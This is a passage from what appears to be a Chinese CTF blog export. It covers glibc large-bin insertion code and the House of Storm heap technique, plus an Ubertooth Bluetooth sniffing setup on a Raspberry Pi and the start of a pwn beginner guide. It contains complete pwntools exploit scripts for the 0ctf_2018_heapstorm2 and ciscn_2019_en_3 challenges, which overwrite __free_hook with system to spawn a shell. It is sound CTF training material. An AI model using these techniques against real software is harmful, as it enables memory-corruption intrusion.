set_inuse_bit_at_offset(victim, size);        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位        if (av != &amp;main_arena)            victim-&gt;size |= NON_MAIN_ARENA;         check_malloced_chunk(av, victim, nb); // 默认不做任何操作        void *p = chunk2mem(victim);//把chunk转换为mem指针        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做        return p;    &#125;      //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中    //如果在smallbin的范围,则放到对应多small bin中    if (in_smallbin_range(size))     &#123;        victim_index = smallbin_index(size);//获取size对应的smallbin的index        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)        fwd = bck-&gt;fd;    &#125;    else//如果不再smallbin的范围，也就是说在large bin 的范围    &#123;        victim_index = largebin_index(size);//获取size对应的large bin的index        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk                //如果large bin 非空，在largbin进行按顺序插入        if (fwd != bck) &#123;            /* Or with inuse bit to speed comparisons */            size |= PREV_INUSE;            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert            /*            \tlarge bin中的chunk是按从大到小排列的，如果size &lt; large bin             \t的最后一个chunk，说明size是这个large bin中的最小的，我们把它            \t加入到此large bin尾部。            */            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;                                fwd = bck;                bck = bck-&gt;bk;                                /*                large bin 中size最小的chunk的fd_nextsize会指向size最大的                那个chunk，也就是首部的chunk。同样，large bin 中size最大的                chunk的bk_nextsize会指向size最小的那个chunk。                victim的bk_nextsize指向large bin原来最小的chunk，它的                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。                把它fd_nextsize和bk_nextsize都修正。                */                victim-&gt;fd_nextsize = fwd-&gt;fd;                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;             else //如果victim不是large bin 中最小的chunk            &#123;                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert                //从大到小（从头到尾）找到合适的位置                while ((unsigned long) size &lt; fwd-&gt;size) &#123;                    fwd = fwd-&gt;fd_nextsize;                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                &#125;\t\t\t\t//如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了                if ((unsigned long) size == (unsigned long) fwd-&gt;size)                    fwd = fwd-&gt;fd;                else                 &#123;                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中                    victim-&gt;fd_nextsize = fwd;                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                    fwd-&gt;bk_nextsize = victim;                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                &#125;                bck = fwd-&gt;bk;            &#125;        &#125;         else //如果large bin 为空，将victim加入到纵向列表        \tvictim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空    //把victim加入到large bin的链表中    victim-&gt;bk = bck;    victim-&gt;fd = fwd;    fwd-&gt;bk = victim;    bck-&gt;fd = victim;&#125;\n在这里用how2heap里glibc2.27的例子来看实现跟glibc2.23不一样的是，随着tcache机制的加入在2.27打storm需要先把tcachebin填满我删除了大部分的英文但保留了部分这样才知道打的是pwn(doge)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x60];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);        // clearenv();&#125;int get_shift_amount(char* pointer)&#123;\t\tint shift_amount = 0;\tlong long ptr = (long long)pointer;\t\t\twhile(ptr &gt; 0x20)&#123;\t\tptr = ptr &gt;&gt; 8; \t\tshift_amount += 1; \t&#125;\t\treturn shift_amount - 1; // Want amount PRIOR to this being zeroed out&#125;int main()&#123;\tinit();    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;\tint* tcaches[7];\tunsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 \t// prevent merging \tmalloc ( 0x18 ); \tint shift_amount = get_shift_amount(unsorted_bin);\t\tprintf(&quot;Shift Amount: %d\\n&quot;, shift_amount); \tsize_t alloc_size = ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);\tif(alloc_size &lt; 0x10)&#123;\t\tprintf(&quot;Chunk Size: 0x%lx\\n&quot;, alloc_size);\t\tputs(&quot;Chunk size is too small&quot;);\t\texit(1);\t&#125;\talloc_size = (alloc_size &amp; 0xFFFFFFFFE) - 0x10; // Remove the size bits\tprintf(&quot;In this case, the chunk size is 0x%lx\\n&quot;, alloc_size);        // Checks to see if the program will crash or not        if((alloc_size &amp; 0x8) != 0 || (((alloc_size &amp; 0x4) == 0x4) &amp;&amp; ((alloc_size &amp; 0x2) != 0x2)))&#123;                puts(&quot;Please try again! :)&quot;);                                return 1;        &#125;//这里crash好多次 :(\tif(alloc_size &lt; 0x410)&#123;\t\t// Fill up the TCache for the proper size\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\ttcaches[i] = malloc(alloc_size);\t\t&#125;\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\tfree(tcaches[i]);\t\t&#125;\t&#125;\telse&#123;\t\tputs(&quot;Not filling up the TCache&quot;);\t&#125;\tlarge_bin  =  malloc ( 0x4d8 );  // size 0x4e0 \t// prevent merging \tmalloc ( 0x18 );\t// FIFO \tfree ( large_bin );  // put small chunks first \tfree ( unsorted_bin );\t// Put the &#x27;large bin&#x27; chunk into the large bin\tunsorted_bin = malloc(0x4e8);\tfree(unsorted_bin);\t// The address that we want to write to!\tfake_chunk = target - 0x10;\t\t((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin-&gt;bk\t// Only needs to be a valid address. \t(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin-&gt;fd\t(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin-&gt;bk_nextsize\tprintf(&quot;String before: %s\\n&quot;, target);\tprintf(&quot;String pointer: %p\\n&quot;, target);\tptr = calloc(alloc_size, 1);\tstrncpy(ptr, &quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47&quot;, 0x58 - 1);\t\tprintf(&quot;String after %s\\n&quot;, target);\tprintf(&quot;Fake chunk ptr: %p\\n&quot;, ptr);\treturn 0;&#125;\n\n不知道为什么在gdb里一直crash，但是直接运行可以成功 :)没法调试放个完整的运行结果\nHouse of Storm======================================Preparing chunks for the exploitPut one chunk into unsorted bin and the other into the large binThe unsorted bin chunk MUST be larger than the large bin chunk.Find the proper chunk size to allocate.Must be exactly the size of the written chunk from above.Shift Amount: 5In this case, the chunk size is 0x46Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)Done to prevent usage of TCache stashingVulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location. This is our target location to get from the allocatorLater on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the locationof your fake chunk.Misalign the location in order to use the primitive as a SIZE value.The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).Vulnerability #2!Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.Make allocation of the size that the value will be written for.Once the allocation happens, the madness beginsOnce in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to write a fake &#x27;size&#x27; value to the location of our target.After this, the target will have a valid size.Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a validsize and remove it from the bin.With this, we have pulled out an arbitrary chunk!String before: String pointer: 0x56053bf12040Make a call to &#x27;calloc&#x27; instead of &#x27;malloc&#x27; in order to not use the TCache on the allocation. Had to fill TCachebecause stashing would prevent the exploit from workingString after ABCDEFGFake chunk ptr: 0x56053bf12040\n\n来看道例题吧据说就是该攻击手法的来源0ctf_2018_heapstorm2glibc2.23checksec\n└─$ checksec 0ctf_2018_heapstorm2[*] &#x27;/Desktop/0ctf_2018_heapstorm2&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n‘start’\nif ( !mallopt(1, 0) )    exit(-1);        //ban掉了fastbin  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)322371584 )//在0x13370000分配一段0x1000的内存    exit(-1);  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )//向0x13370800读入24字节的随机数    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];\n读入了3个随机数，第4个和第3个一样，我们记作r1,r2,r3,r4初始化后面的地址，用r1异或0 作为ptr的值，r2异或0作为size值，我们之后的ptr都是通过xor r1得到的，size都是 xor r2得到的\npwndbg&gt; x /40gx 0x133708000x13370800:    0x72cec7f9b44fb49e  0x438137bc554b405e0x13370810:    0x7a4f542a3248dba2  0x00000000000000000x13370820:    0x0000000000000000  0x00000000000000000x13370830:    0x0000000000000000  0x00000000000000000x13370840:    0x0000000000000000  0x00000000000000000x13370850:    0x0000000000000000  0x0000000000000000\n\n1.Allocate注意xor\nvoid __fastcall sub_DE6(_QWORD *a1)&#123;  __int64 v1; // rsi  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  void *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    v1 = a1[2 * i + 5];    if ( !sub_BCC(a1, v1) )    &#123;      printf(&quot;Size: &quot;);      v3 = sub_1551(&quot;Size: &quot;, v1);      if ( v3 &gt; 12 &amp;&amp; v3 &lt;= 4096 )      &#123;        v4 = calloc(v3, 1uLL);        if ( !v4 )          exit(-1);        a1[2 * i + 5] = sub_BCC(a1, v3); //a1[i+2].m_size = a1[0].m_size ^ input_size        a1[2 * i + 4] = sub_BB0(a1, (__int64)v4);//a1[i+2].m_heap = a1[0].m_heap ^ heap_addr        printf(&quot;Chunk %d Allocated\\n&quot;, (unsigned int)i);      &#125;      else      &#123;        puts(&quot;Invalid Size&quot;);      &#125;      return;    &#125;  &#125;&#125;\n2.Update\nint __fastcall sub_F21(_QWORD *a1, __int64 a2)&#123;  __int64 v2; // rsi  signed int v4; // [rsp+10h] [rbp-20h]  int v5; // [rsp+14h] [rbp-1Ch]  __int64 v6; // [rsp+18h] [rbp-18h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF )    return puts(&quot;Invalid Index&quot;);  v2 = a1[2 * v4 + 5];  if ( !sub_BCC(a1, v2) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Size: &quot;);  v5 = sub_1551(&quot;Size: &quot;, v2);  if ( v5 &lt;= 0 || v5 &gt; (unsigned __int64)(sub_BCC(a1, a1[2 * v4 + 5]) - 12) )// 0&lt;v5&lt;=size -12    return puts(&quot;Invalid Size&quot;);  printf(&quot;Content: &quot;);  v6 = sub_BB0(a1, a1[2 * v4 + 4]);  sub_1377(v6, v5);//off-by-null  strcpy((char *)(v5 + v6), &quot;HEAPSTORM_II&quot;);  return printf(&quot;Chunk %d Updated\\n&quot;, (unsigned int)v4);&#125;\n3.Delete\nint __fastcall sub_109B(_QWORD *a1, __int64 a2)&#123;  void *v3; // rax  signed int v4; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF || !sub_BCC(a1, a1[2 * v4 + 5]) )    return puts(&quot;Invalid Index&quot;);  v3 = (void *)sub_BB0(a1, a1[2 * v4 + 4]);  free(v3);  a1[2 * v4 + 4] = sub_BB0(a1, 0LL);//ptr  a1[2 * v4 + 5] = sub_BCC(a1, 0LL);//size这俩都只是被xor了，没清零  return printf(&quot;Chunk %d Deleted\\n&quot;, (unsigned int)v4);&#125;\n4.View\nint __fastcall sub_11B5(_QWORD *a1, __int64 a2)&#123;  __int64 v3; // rbx  __int64 v4; // rax  signed int v5; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 322401073LL )//要满足r2 xor r3 = 0x13377331才可以view    return puts(&quot;Permission denied&quot;);  printf(&quot;Index: &quot;);  v5 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v5 &gt; 0xF || !sub_BCC(a1, a1[2 * v5 + 5]) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Chunk[%d]: &quot;, (unsigned int)v5);  v3 = sub_BCC(a1, a1[2 * v5 + 5]);  v4 = sub_BB0(a1, a1[2 * v5 + 4]);  sub_14D4(v4, v3);  return puts(byte_180A);&#125;\n回顾一下house of storm的条件glibc版本小于2.30This requires the following:Write on free unsorted bin chunkWrite on free large bin chunkKnown address of target memory addressKnown address of upper bits of heap chunk\n程序可能crash多跑几次\nfrom pwn import *from pwn import p32,p64,u32,u64context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25201)#p = process(&#x27;./0ctf_2018_heapstorm2&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(size):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;,str(size))def edit(idx,content):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))    p.sendlineafter(b&#x27;Size: &#x27;,str(len(content)))    p.recvuntil(b&#x27;Content: &#x27;)    p.send(content)def delete(idx):    p.recvuntil(&#x27;Command: &#x27;)    p.sendline(&#x27;3&#x27;)    p.recvuntil(&#x27;Index: &#x27;)    p.sendline(&#x27;%d&#x27; % idx)def show(idx):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))#---------------堆风水，启动！-------------------------#add(0x18)#chunk0\t  off_by_null修改1的sizeadd(0x508)#chunk1add(0x18)#chunk2#---------------add(0x18)#chunk3   off_by_null修改4的sizeadd(0x508)#chunk4add(0x18)#chunk5   #---------------add(0x18)#chunk6   防止合并到top_chunk#----------------unsorted chunk-----------------------#edit(1,b&#x27;\\x00&#x27;*0x4F0 + p64(0x500)) #fake_chunkdelete(1)edit(0,b&#x27;\\x00&#x27;*(0x18-12)) #修改chunk1的size， 0x511-&gt;0x500add(0x18) #chunk1 add(0x4d8) #chunk7    把0x500用完delete(1)   delete(2) #chunk1-chunk2 合并   这是就存在堆重叠add(0x38)#chunk1add(0x4e8)#chunk2   chunk7的content指向chunk2的chunk-0x10位置处,我们可以实现控制unsorted chunk#-------------------large chunk-----------------------------------#edit(4,b&#x27;\\x00&#x27;*0x4F0+p64(0x500))#fake_chunkdelete(4)edit(3,b&#x27;\\x00&#x27;*(0x18-12)) #修改chunk4的size， 0x511-&gt;0x500add(0x18) #chunk4add(0x4d8) #chunk8   把0x500用完delete(4)delete(5) #chunk4-chunk5 合并 这是就存在堆重叠add(0x48)#chunk4  此时unsorted bin中剩下一个0x4e1大小的chunk，且与chunk8重叠，我们可以实现控制large chunk#---------------unsorted chunk 和 large chunk ----------------------#delete(2)add(0x4e8) #把0x4e1的chunk放入到largebin中delete(2)  #把0x4F1的chunk放入到unsorted bin中#---------------storm approching------------------------------#fake_chunk = 0x13370800 - 0x20payload = b&#x27;\\x00&#x27; * 0x10 payload += p64(0) payload += p64(0x4f1) payload += p64(0) payload += p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = b&#x27;\\x00&#x27; * 0x20 payload += p64(0) payload += p64(0x4e1) payload += p64(0) payload += p64(fake_chunk+8) payload += p64(0) payload += p64(fake_chunk-0x18-5)edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsizeadd(0x48)  #chunk2  -&gt; 0x133707e0   成功将申请到了heaparray附近#-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件show(1)  #我们刚刚house of storm 写的地址泄漏出来p.recvuntil(&quot;]: &quot;)heap = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))success(&quot;heap:%s&quot;+hex(heap))payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #泄漏libc地址p.recvuntil(&quot;]: &quot;)malloc_hook = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) -0x58 - 0x10libc_base = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]system = libc_base+ libc.sym[&#x27;system&#x27;]success(&quot;free_hook:%s&quot;+hex(free_hook))#--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += b&#x27;/bin/sh\\x00&#x27;edit(0, payload)edit(0, p64(system))delete(1)p.interactive()\n\n\nI am the storm that is approaching我即是那迫近的风暴Provoking black clouds in isolation唤醒樊笼中的乌云I am reclaimer of my name我要收回我的真名Born in flames, I have been blessed生于火焰 受尽祝福My family crest is a demon of death!死亡恶魔即是我的家徽Forsakened, I am awakened觉醒时已被遗弃A phoenix&#x27;s ash in dark divine凤凰的灰烬在黑暗神灵旁飘落Descending misery苦难降临Destiny chasing time命运追逐着时光","categories":["heap"],"tags":["bin"]},{"title":"raspberrypi","url":"/2024/01/18/raspberrypi/","content":"首先树莓派的环境配置我的是树莓派5，选了64位的记得高级选项里面开ssh服务和配置WIFI\n稍微吐槽一下他的接口，有点难插），所以还是喜欢用ssh\nsd卡的插槽在背面（我先把外壳装上了找了老久233）\n搞起来之后在路由器的后台就能找到树莓派的ip\n试过用tigervnc搞远程桌面，延迟挺大的，但能用\n连上开始配环境,我用的设备是ubertoolth one可以跟这个文档https://ubertooth.readthedocs.io/en/latest/index.html但是树莓派5是debian12的了，wireshark也有更新，会有些小问题\n先装蓝牙依赖\nsudo apt install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev wget \\pkg-config python3-numpy python3-qtpy python3-distutils python3-setuptools\nlibbtbb：\nwget https://github.com/greatscottgadgets/libbtbb/archive/2020-12-R1.tar.gz -O libbtbb-2020-12-R1.tar.gztar -xf libbtbb-2020-12-R1.tar.gzcd libbtbb-2020-12-R1mkdir buildcd buildcmake ..makesudo make installsudo ldconfig\nubertooth tools：\nwget https://github.com/greatscottgadgets/ubertooth/releases/download/2020-12-R1/ubertooth-2020-12-R1.tar.xztar -xf ubertooth-2020-12-R1.tar.xzcd ubertooth-2020-12-R1/hostmkdir buildcd buildcmake ..makesudo make installsudo ldconfig\n装wireshark和ubertooth插件这一步cmake的时候会有问题\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbbmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan .. makesudo make install\n我瞎搞做了以下操作\nexport C_INCLUDE_PATH=/usr/include/wiresharkexport CPLUS_INCLUDE_PATH=/usr/include/wireshark\n然后在&#x2F;usr&#x2F;include&#x2F;wireshark下给他创了一个config.h（啥都没写的）编译就过了) 虽然很多警告\n以下同理，安装蓝牙插件\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbredrmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan ..makesudo make install\n设置wireshark权限\nsudo groupadd wiresharksudo chgrp wireshark /usr/bin/dumpcapsudo chmod 4755 /usr/bin/dumpcapsudo gpasswd -a 你的用户名 wireshark\n\n开冲在tmp下\nrm pipemkfifo pipe\n然后在wireshark设置（这里没截图，用了我ubuntu上的wireshark，但是同理）然后在命令行\nubertooth-btle -f -c /tmp/pipe\n就可以开始嗅探了可以看到wireshark中的抓包内容\n","categories":["plays"],"tags":["plays"]},{"title":"free_hook","url":"/2023/09/14/free-hook/","content":"free_hook的调用\nvoid (*hook) (void *, const void *)= atomic_forced_read (__free_hook);if (__builtin_expect (hook != NULL, 0))&#123;(*hook)(mem, RETURN_ADDRESS (0));return;&#125;\n对应的汇编代码\n.text:00000000000736F4                 sub     rsp, 8          ; Alternative name is &#x27;cfree&#x27;.text:00000000000736F8                 mov     rax, cs:__free_hook_ptr.text:00000000000736FF                 mov     rax, [rax].text:0000000000073702                 test    rax, rax.text:0000000000073705                 jz      short loc_73710.text:0000000000073707                 mov     rsi, [rsp+8].text:000000000007370C                 call    rax\nfree_hook的存储的位置,在 free_hook上方 -0xb58 我们可以找到满足top_chunk要求的大小libc-2.27.so\npwndbg&gt; p &amp;__free_hook$2 = (void (**)(void *, const void *)) 0x7ffff7dcf8e8 &lt;__free_hook&gt;pwndbg&gt; x/8gx 0x7ffff7dcf8e8 - 0xb580x7ffff7dced90 &lt;initial+16&gt;:\t0x0000000000000004\t0x05fc5621ed6fad690x7ffff7dceda0 &lt;initial+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedb0 &lt;initial+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedc0 &lt;initial+64&gt;:\t0x0000000000000000\t0x0000000000000000\n伪造的fastbin的addr为0x7ffff7dced90当程序可以在该位置申请chunk的时候，通过重复向top_chunk申请最终覆写__free_hook的值为system的值通过free &#x2F;bin&#x2F;sh\\x00的chunk,达到程序流劫持getshell。\n修改global_max_fast通过fastbin attack 使得可以申请指定大小的，包含free_hook的chunk，比如利用0x7ffff7dced98处的值，但是这里要合理去构造偏移\npwndbg&gt; x/50gx 0x7ffff7dcf8e8-0xC000x7ffff7dcece8 &lt;lock.10026+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcecf8 &lt;maxmap&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced08 &lt;string_space_max&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced18 &lt;lock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced28:\t0x0000000000000000\t0x00000000000000000x7ffff7dced38 &lt;lock+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced48 &lt;phys_pages.8062&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced58 &lt;last_environ&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced68 &lt;envlock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced78:\t0x0000000000000000\t0x00000000000000000x7ffff7dced88 &lt;initial+8&gt;:\t0x0000000000000001\t0x00000000000000040x7ffff7dced98 &lt;initial+24&gt;:\t0x05fc5621ed6fad69\t0x0000000000000000......\n\n看个例题8~ciscn_2019_en_3\n[*] &#x27;~/ciscn_2019_en_3&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled```\n程序只实现了add和deletemain函数里的_printf_chk能泄露libc地址\nputs(&quot;What&#x27;s your name?&quot;);read(0, buf, 0x20uLL);_printf_chk(1LL, buf);puts(&quot;Please input your ID.&quot;);read(0, s, 8uLL);puts(s);\n_printf_chk有两个参数，第一个参数0x1代表保护级别存入寄存器rdi，第二个参数才是我们输入的格式化利用字符串%p-%p-%p存入寄存器rsi。动调发现寄存器rcx存放的是read+17的地址根据64位linux下前6个寄存器传参的习惯（rdi&#x2F;rsi&#x2F;rdx&#x2F;rcx&#x2F;r8&#x2F;r9）此处已经用了两个寄存器。所以第二个%p将会打印出rcx存放的值。\nRCX  0x7ffff7af2031 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */RDX  0x20RDI  0x1RSI  0x7fffffffe2a0 ◂— 0xa61616161 /* &#x27;aaaa\\n&#x27; */R8   0x11R9   0x7ffff7fe1500 ◂— 0x7ffff7fe1500\nadd\nunsigned __int64 sub_BE9()&#123;  int v0; // ebx  int v2; // [rsp+4h] [rbp-1Ch] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-18h]  v3 = __readfsqword(0x28u);  if ( dword_20204C &gt; 16 )    puts(&quot;Enough!&quot;);  puts(&quot;Please input the size of story: &quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v2);  *((_DWORD *)&amp;unk_202060 + 4 * dword_20204C) = v2;  v0 = dword_20204C;  *((_QWORD *)&amp;unk_202068 + 2 * v0) = malloc(v2);  puts(&quot;please inpute the story: &quot;);  read(0, *((void **)&amp;unk_202068 + 2 * dword_20204C), v2);  ++dword_20204C;  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v3;&#125;\ndelete存在UAF\nunsigned __int64 sub_D32()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Please input the index:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v1);  free(*((void **)&amp;unk_202068 + 2 * v1));  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\n打one_gadget没穿\n└─$ one_gadget libc-2.27.so0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n最后打的是将free_hook改为system，第二个堆块写’&#x2F;bin&#x2F;sh\\x00’\n[+] read        : 0x7f8e125b6070[+] libc_base   : 0x7f8e124a6000[+] sys_addr    : 0x7f8e124f5440[+] one_gadget  : 0xff1c2499b322[+] malloc_hook : 0x7f8e12891c30[+] free_hook   : 0x7f8e128938e8\nexp:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)elf = ELF(&#x27;./ciscn_2019_en_3&#x27;)#p = process(&#x27;./ciscn_2019_en_3&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29868)def add(size,buf):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(1))\tp.recvuntil(&quot;Please input the size of story: \\n&quot;)\tp.sendline(str(size))\tp.recvuntil(&quot;please inpute the story: \\n&quot;)\tp.sendline(buf)def free(idx):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(4))\tp.recvuntil(&quot;Please input the index:\\n&quot;)\tp.sendline(str(idx))one_gadget = 0x4f322p.recvuntil(&quot;What&#x27;s your name?\\n&quot;)p.sendline(b&quot;%p-%p-%p&quot;)p.recvuntil(&quot;-&quot;)info = p.recvuntil(&quot;-&quot;, drop=True)info = int(info.decode(&quot;ISO-8859-1&quot;), 16)-17read = libc.sym[&quot;read&quot;]libc_base = info-readsys_addr = libc_base + libc.sym[&#x27;system&#x27;]one_gadget = libc_base + 0x4f322malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + one_gadgetp.recvuntil(&quot;Please input your ID.\\n&quot;)p.send(&quot;a&quot;)# alloc to libcadd(0x20, &quot;a&quot;)  # 0free(0)free(0)#double_free chunk0add(0x20, p64(free_hook))   # 1add(0x20, &quot;/bin/sh\\x00&quot;) # 2add(0x20, p64(sys_addr))#pause()free(1)#gdb.attach(p)success(&quot;read        : &quot; + hex(info))success(&quot;libc_base   : &quot; + hex(libc_base))success(&quot;sys_addr    : &quot; + hex(sys_addr))success(&quot;one_gadget  : &quot; + hex(one_gadget))success(&quot;malloc_hook : &quot; + hex(malloc_hook))success(&quot;free_hook   : &quot; + hex(free_hook))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"pwn入门指北","url":"/2023/07/02/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/","content":"To all begin pwnner\n什么是Pwn    “Pwn”是一个拟声词，代表着攻破，获取权限，由”own”一次引申而来。在CTF比赛中，一道pwn题通常会给解题者提供二进制文件，一个靶机。解题者需要通过对二进制文件进行逆向分析，找到其中的漏洞并对漏洞加以利用，最终实现对靶机的提权（简单pwn题的解题详见真.入门之一道pwn题）。\n学Pwn能学到什么    1.亿点点的逆向工程。大部分Pwn题都要求先对二进制文件进行逆向分析，掌握一定的逆向技巧是必不可少的。同CTF中的reverse侧重于算法稍有不同，Pwn题的逆向侧重于漏洞的发现与利用。   2.C语言与汇编语言以及python。阅读二进制文件反汇编出的汇编代码与反编译后的伪代码需要有一定的C语言与汇编语言基础。漏洞利用所常用的pwntools库的使用需要一丢丢的python编程基础。    